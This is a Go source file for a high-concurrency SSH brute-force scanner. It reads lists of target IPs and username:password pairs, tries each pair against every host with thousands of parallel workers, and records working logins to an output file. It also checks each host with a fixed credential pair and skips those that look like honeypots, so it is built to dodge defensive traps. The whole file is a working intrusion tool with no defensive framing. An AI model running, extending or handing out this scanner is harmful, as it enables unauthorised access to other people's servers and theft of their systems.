package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

// ANSI color codes
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

type Config struct {
	IPFile     string
	CredsFile  string
	Workers    int
	Timeout    int
	OutputFile string
	Port       int
	AppendMode bool
	SingleUser string
	SinglePass string
}

type Credential struct {
	Username string
	Password string
}

var (
	successCount uint64
	failedCount  uint64
	honeypotCount uint64
	startTime    time.Time
)

const (
	defaultWorkers = 5000
	defaultTimeout = 3
	statsInterval  = 500 * time.Millisecond
	honeypotUser   = "root"
	honeypotPass   = "honeypotlist"
)

func main() {
	config := parseArgs()
	startTime = time.Now()
	runtime.GOMAXPROCS(runtime.NumCPU())

	ips := loadLines(config.IPFile)
	var creds []Credential
	
	// Handle single credential case
	if config.SingleUser != "" && config.SinglePass != "" {
		creds = append(creds, Credential{
			Username: config.SingleUser,
			Password: config.SinglePass,
		})
	} else {
		creds = loadCredentials(config.CredsFile)
	}
	
	totalTasks := len(ips) * len(creds)

	fmt.Printf("%sStarting scan with %d workers%s\n", colorBlue, config.Workers, colorReset)
	fmt.Printf("%sTargets: %d IPs | Credentials: %d%s\n", colorBlue, len(ips), len(creds), colorReset)
	fmt.Printf("%sTimeout: %d seconds%s\n", colorBlue, config.Timeout, colorReset)
	fmt.Printf("%sHoneypot detection: %s:%s%s\n\n", colorBlue, honeypotUser, honeypotPass, colorReset)

	outputFile := getOutputFile(config.OutputFile, config.AppendMode)
	defer outputFile.Close()

	honeypotFile, err := os.OpenFile("honeypot.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("%sError creating honeypot file: %v%s\n", colorRed, err, colorReset)
		os.Exit(1)
	}
	defer honeypotFile.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var wg sync.WaitGroup
	ipChan := make(chan string, config.Workers*2)
	results := make(chan string, config.Workers*2)
	honeypotResults := make(chan string, config.Workers*2)

	// Real-time stats display
	go func() {
		ticker := time.NewTicker(statsInterval)
		defer ticker.Stop()
		lastCount := uint64(0)
		lastTime := time.Now()

		for {
			select {
			case <-ticker.C:
				now := time.Now()
				current := atomic.LoadUint64(&successCount) + atomic.LoadUint64(&failedCount) + atomic.LoadUint64(&honeypotCount)
				elapsed := now.Sub(lastTime).Seconds()
				speed := float64(current-lastCount) / elapsed
				progress := float64(current) / float64(totalTasks) * 100

				fmt.Printf("\r%sSuccess: %s%d%s | %sFailed: %s%d%s | %sHoneypots: %s%d%s | %sSpeed: %s%.0f/s%s | %sProgress: %s%.2f%%%s",
					colorYellow, colorGreen, atomic.LoadUint64(&successCount), colorYellow,
					colorYellow, colorRed, atomic.LoadUint64(&failedCount), colorYellow,
					colorYellow, colorPurple, atomic.LoadUint64(&honeypotCount), colorYellow,
					colorYellow, colorCyan, speed, colorYellow,
					colorYellow, colorPurple, progress, colorYellow)

				lastCount = current
				lastTime = now
			case <-ctx.Done():
				return
			}
		}
	}()

	// Worker pool
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			dialer := &net.Dialer{
				Timeout:   time.Duration(config.Timeout) * time.Second,
				KeepAlive: -1,
			}

			for {
				select {
				case ip, ok := <-ipChan:
					if !ok {
						return
					}
					
					// First check for honeypot
					if testSSH(dialer, ip, honeypotUser, honeypotPass, config.Port) {
						select {
						case honeypotResults <- fmt.Sprintf("%s:%s@%s", honeypotUser, honeypotPass, ip):
							atomic.AddUint64(&honeypotCount, 1)
						case <-ctx.Done():
							return
						}
						continue // Skip other credentials if it's a honeypot
					}
					
					// Test other credentials
					for _, cred := range creds {
						if testSSH(dialer, ip, cred.Username, cred.Password, config.Port) {
							select {
							case results <- fmt.Sprintf("%s:%s@%s", cred.Username, cred.Password, ip):
								atomic.AddUint64(&successCount, 1)
							case <-ctx.Done():
								return
							}
						} else {
							atomic.AddUint64(&failedCount, 1)
						}
					}
				case <-ctx.Done():
					return
				}
			}
		}()
	}

	// Result writer
	go func() {
		for {
			select {
			case res, ok := <-results:
				if !ok {
					return
				}
				outputFile.WriteString(res + "\n")
			case <-ctx.Done():
				return
			}
		}
	}()

	// Honeypot result writer
	go func() {
		for {
			select {
			case res, ok := <-honeypotResults:
				if !ok {
					return
				}
				honeypotFile.WriteString(res + "\n")
			case <-ctx.Done():
				return
			}
		}
	}()

	// Feed IPs to workers
	go func() {
		defer close(ipChan)
		for _, ip := range ips {
			select {
			case ipChan <- ip:
			case <-ctx.Done():
				return
			}
		}
	}()

	wg.Wait()
	close(results)
	close(honeypotResults)

	fmt.Printf("\n\n%sScan completed in %s%s\n", colorGreen, time.Since(startTime).Round(time.Second), colorReset)
	fmt.Printf("%sTotal: %s%d%s | %sSuccess: %s%d%s | %sFailed: %s%d%s | %sHoneypots: %s%d%s\n",
		colorBlue, colorWhite, successCount+failedCount+honeypotCount, colorBlue,
		colorBlue, colorGreen, successCount, colorBlue,
		colorBlue, colorRed, failedCount, colorBlue,
		colorBlue, colorPurple, honeypotCount, colorReset)
}

func testSSH(dialer *net.Dialer, ip, user, pass string, port int) bool {
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return false
	}
	defer conn.Close()

	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(2) * time.Second,
	}

	client, _, _, err := ssh.NewClientConn(conn, fmt.Sprintf("%s:%d", ip, port), config)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func getOutputFile(filename string, appendMode bool) *os.File {
	if appendMode {
		file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("%sError opening output file: %v%s\n", colorRed, err, colorReset)
			os.Exit(1)
		}
		return file
	}

	if _, err := os.Stat(filename); err == nil {
		timestamp := time.Now().Format("20060102-150405")
		ext := filepath.Ext(filename)
		filename = fmt.Sprintf("%s_%s%s", strings.TrimSuffix(filename, ext), timestamp, ext)
	}

	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("%sError creating output file: %v%s\n", colorRed, err, colorReset)
		os.Exit(1)
	}
	return file
}

func loadLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("%sError opening file: %v%s\n", colorRed, err, colorReset)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}

func loadCredentials(filename string) []Credential {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("%sError opening file: %v%s\n", colorRed, err, colorReset)
		os.Exit(1)
	}
	defer file.Close()

	var creds []Credential
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		parts := strings.SplitN(scanner.Text(), ":", 2)
		if len(parts) == 2 {
			creds = append(creds, Credential{
				Username: strings.TrimSpace(parts[0]),
				Password: strings.TrimSpace(parts[1]),
			})
		}
	}
	return creds
}

func parseArgs() Config {
	config := Config{
		Workers:    defaultWorkers,
		Timeout:    defaultTimeout,
		Port:       22,
		AppendMode: false,
	}

	flag.StringVar(&config.IPFile, "ip", "", "File containing target IPs (required)")
	flag.StringVar(&config.CredsFile, "c", "", "Credentials file (format: user:pass)")
	flag.IntVar(&config.Workers, "w", defaultWorkers, "Number of worker goroutines")
	flag.IntVar(&config.Timeout, "to", defaultTimeout, "Connection timeout in seconds")
	flag.IntVar(&config.Port, "p", config.Port, "SSH port number")
	flag.StringVar(&config.OutputFile, "o", "results.txt", "Output file for results")
	flag.BoolVar(&config.AppendMode, "a", false, "Append to output file instead of overwriting")
	flag.StringVar(&config.SingleUser, "u", "", "Single username to test")
	flag.StringVar(&config.SinglePass, "pwd", "", "Single password to test")

	flag.Parse()

	if config.IPFile == "" {
		fmt.Printf("%sError: IP file argument is required%s\n", colorRed, colorReset)
		flag.PrintDefaults()
		os.Exit(1)
	}

	if config.CredsFile == "" && (config.SingleUser == "" || config.SinglePass == "") {
		fmt.Printf("%sError: Either credentials file or single user/password is required%s\n", colorRed, colorReset)
		flag.PrintDefaults()
		os.Exit(1)
	}

	return config
}